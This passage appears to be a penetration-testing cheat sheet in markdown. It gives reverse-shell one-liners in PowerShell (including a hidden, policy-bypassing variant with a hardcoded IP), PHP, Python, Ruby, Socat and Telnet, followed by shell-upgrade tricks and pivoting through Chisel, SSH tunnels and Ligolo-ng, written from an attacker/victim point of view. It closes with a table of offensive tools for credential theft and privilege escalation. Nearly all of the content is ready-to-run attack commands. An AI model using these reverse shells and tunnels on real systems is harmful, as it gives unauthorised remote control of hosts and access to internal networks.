> powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
> ```
### Alternative
> ```powershell
> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
> ```
### Also Reliable
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient("10.10.173.147",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```

- ### PHP
> ```php
> php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
> ```

- ### Python
> ```python
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
> ```

- ### Ruby
> ```ruby
> ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
> ```

- ### Socat
> ```bash
> socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
> ```

- ### Telnet
> ```bash
> rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
> ```

- ### Tool for Generating Reverse Shell
> ```bash
> git clone https://github.com/ShutdownRepo/shellerator
> ```
> ```python
> pip3 install --user -r requirements.txt
> ```
> ```bash
> sudo cp shellrator.py /bin/shellrator
> shellrator
> ```

**Upgrading shells**

> ```bash
> script /dev/null -c /bin/bash
> ```

### Find terminal size (replace values with actual output)
> ```bash
> stty size  # Example output: 50 235
> ```
### Background the shell and adjust settings
> ```text
> Ctrl-Z
> ```
> ```bash
> stty raw -echo  # Disable shell echo
> fg
> export SHELL=bash
> export TERM=xterm  # Or use xterm-256color for extended color support
> ```
### Set terminal size
> ```bash
> stty rows <ROWS> columns <COLS>
> ```

- Bash
### Spawn a new Bash shell
> ```bash
> bash -i
> ```

- Lua
### Execute a new Bash shell
> ```lua
> os.execute('/bin/bash')
> ```

- Perl
### Execute a new Bash shell
> ```perl
> perl -e 'exec "/bin/bash"'
> ```

- Python
### Python 2.x
> ```python
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```
### Python 3.x
> ```python
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```
### Upgrade to a TTY shell with Python
> ```python
> python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -echo")'
> ```

- Ruby
### Execute a new Bash shell
> ```ruby
> exec "/bin/bash"
> ```
### Spawn a new interactive shell
> ```ruby
> sh -i
> ```

- Socat
- Attacker
> ```bash
> socat file:`tty`,raw,echo=0 tcp-listen:4444
> ```
- Listener
> ```bash
> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP Address>:4444
> ```

---

## Port Forwarding

- Using Socat
> ```bash
> socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
> ```

## Chisel

1. Basic Syntax
- Attacker:
> ```bash
> chisel server --socks5 --reverse
> ```
- Victim: 
> ```cmd
> .\chisel.exe client --fingerprint [fingerprint when server starts] {ATTACKER IP]:8080 R:socks
> ```

2. Port Forwarding
- ### In remote machine
> ```bash
> chisel server -p <listen-port>
> ```
- ### In local machine
> ```bash
> chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
> ```

3. Reverse Port Forwarding
It is useful when we want to access to the host and the port that cannot be directly accessible from local machine.

- 1. Create the forwarding
### In local machine
> ```bash
> chisel server -p <LOCAL_PORT> --reverse
> ```
### In remote machine
> ```bash
> chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>
> ```
### Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, <LOCAL_FORWARD_PORT> with the port on your local machine to which the remote service will be forwarded, <REMOTE_IP> with the IP address of the remote machine, and <REMOTE_PORT> with the port on the remote machine.

- 2. Access the forwarded service
> ```bash
> curl http://localhost:<LOCAL_FORWARD_PORT>
> ```
### The result is the content from http://<REMOTE_IP>:<REMOTE_PORT>/

4. Forward Dynamic SOCKS Proxy
- 1. Create the forwarding
### In remote
> ```bash
> chisel server -p <REMOTE_PORT> --socks5
> ```
### In local
> ```bash
> chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
> ```
### Replace <REMOTE_PORT> with the port for the SOCKS proxy on the remote machine, <REMOTE_IP> with the IP address of the remote machine, and <LOCAL_PORT> with the port on your local machine where the SOCKS proxy will be available.

- 2. Then modify /etc/proxychains.conf in local machine
> ```text
> # Comment out the line of "socks4"
> # /etc/proxychains.conf
> ...
> socks5 127.0.0.1 <LOCAL_PORT>
> ```

5. Reverse Dynamic SOCKS Proxy
It is useful when we want to access to the host & multiple ports that cannot be directly accessible from local machine.

- 1. Create the forwarding
### In local machine
> ```bash
> chisel server -p <LOCAL_PORT> --reverse
> ```
### In remote machine
> ```bash
> chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
> ```
### Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, and <REMOTE_PORT> with the port on the remote machine where the SOCKS proxy will be available.

- 2. Then modify /etc/proxychains.conf in local machine
> ```text
> # /etc/proxychains.conf
> ...
> socks5 127.0.0.1 <REMOTE_PORT>
> ```

- 3. Confirm that we can access the desired host and port with proxychains
> ```bash
> proxychains nmap localhost
> ```

## SSH

- SSH Local Port Forwarding
> ```bash
> ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
> ```

- SSH Dynamic Port Forwarding
### Setting Up Dynamic Port Forwarding
> ```bash
> ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
> ```
### Configure Proxychains
> ```text
> # /etc/proxychains4.conf
> [ProxyList]
> socks5 127.0.0.1 [local_socks_proxy_port]
> ```
### Run commands pre-adding proxychains
### For example
> ```bash
> proxychains smbclient -L //internal_ip/ -U username --password=password
> ```

- SSH Remote Port Forwarding
> ```bash
> ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
> ```

- SSH Remote Dynamic Port Forwarding
### Setting up the Remote Dynamic Port Forwarding
> ```bash
> ssh -N -R [proxychains_port] username@remote_host
> ```
### Configure the Proxychains
> ```text
> # /etc/proxychains4.conf
> [ProxyList]
> socks5 127.0.0.1 [proxychains_port]
> ```

- SSH (Windows)
### Find SSH Location and Version
> ```cmd
> where ssh
> ssh.exe -V
> ```
### Connect to a Remote Machine with Dynamic Port Forwarding
> ```cmd
> ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
> ```
### Configure Proxychains on Kali
> ```text
> # Edit /etc/proxychains4.conf and add
> [ProxyList]
> socks5 127.0.0.1 [REMOTE_PORT]
> 
### Check Open SOCKS Port on Kali
> ```bash
> ss -ntplu
> ```

## Ligolo-ng

1. Before Starting ligolo
> ```bash
> sudo ip tuntap add user [username] mode tun ligolo
> sudo ip link set ligolo up
> sudo ip addr show ligolo
> ```

2. Start the proxy
> ```bash
> sudo ./ligolo-proxy -selfcert
> ```

Start the attacker
> ```cmd
> .\agent.exe -connect [IP ADDRESS]:11601 -ignore-cert
> ```

3. Setting up the session
> ```text
> ligolo-ng » session
> ```

4. Add route to internal network in seperate terminal window
- ### IP address is typically interface 1 using ifconfig
>```bash
> sudo ip route add 10.10.10.0/24 dev ligolo
> ```

5. Start the tunnel
### after selecting the session, run the command start

6. Setting interfaces
- ### Basic interface to connect for all proxies
> ```text
> listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601         
> ```
- ### For sending files or reverse shells, port can be anything
> ```text
> listener_add --addr 0.0.0.0:7777 --to 0.0.0.0:7777          
> ```
- ### add flag --tcp for reverse shells

7. Accessing Pivot Machine Ports
> ```bash
> sudo ip route add 240.0.0.1/32 dev ligolo
> ```

8. Cleanup after finished using ligolo
> ```bash
> sudo ip link set ligolo down
> sudo ip link delete ligolo
> ```

****When using proxy, don't forget to use the IP address from the interface of the pivot machine.

- Reference 
- https://www.youtube.com/watch?v=DM1B8S80EvQ&t=90s
- https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5

---

## Various Tools

| Software                  | URL                                                                                       |
|---------------------------|-------------------------------------------------------------------------------------------|
| adPEAS                    | [https://github.com/ajm4n/adPEAS](https://github.com/ajm4n/adPEAS)                        |
| certify                   | [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)              |
| certipy                   | [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)                        |
| chisel                    | [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases) |
| Dirtyc0W                  | [https://dirtycow.ninja/](https://dirtycow.ninja/)                                         |
| Get-SPNS                  | [https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1) |
| git-dumper                | [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)            |
| gtfobins                  | [https://gtfobins.org/](https://gtfobins.org/)                                             |
| kerbrute                  | [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)                  |
| lapsdumper                | [https://github.com/n00py/LAPSDumper](https://github.com/n00py/LAPSDumper)                |
| ligolo                    | [https://github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases) |
| mimikatz.exe              | [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)          |
| nuclei                    | [https://github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)  |
| ntlm_theft                | [https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)        |
| PayloadsAllTheThings      | [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| PowerMad                  | [https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad) |
| PowerUp.ps1               | [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) |
| PowerView                 | [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) |
| powercat                  | [https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)        |
| pywhisker                 | [https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker)    |
| pylaps                    | [https://github.com/p0dalirius/pyLAPS/tree/main](https://github.com/p0dalirius/pyLAPS/tree/main) |
| PrintSpoofer              | [https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases) |
| rubeus                    | [https://github.com/GhostPack/Rubeus/releases](https://github.com/GhostPack/Rubeus/releases) |
| seatbelt                  | [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)            |
| SharpGPOAbuse             | [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) |
| SharpUp.exe               | [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) |
| Snaffler                  | [https://github.com/SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)              |
| suid3num.py               | [https://github.com/Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)  |
| targetedKerberoast        | [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) |
| windapsearch              | [https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)          |
| PSTools                   | [https://learn.microsoft.com/en-us/sysinternals/downloads/pstools](https://learn.microsoft.com/en-us/sysinternals/downloads/pstools) |
| revshells                 | [https://www.revshells.com/](https://www.revshells.com/)                                   |
| firefox decrypt           | [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)      |
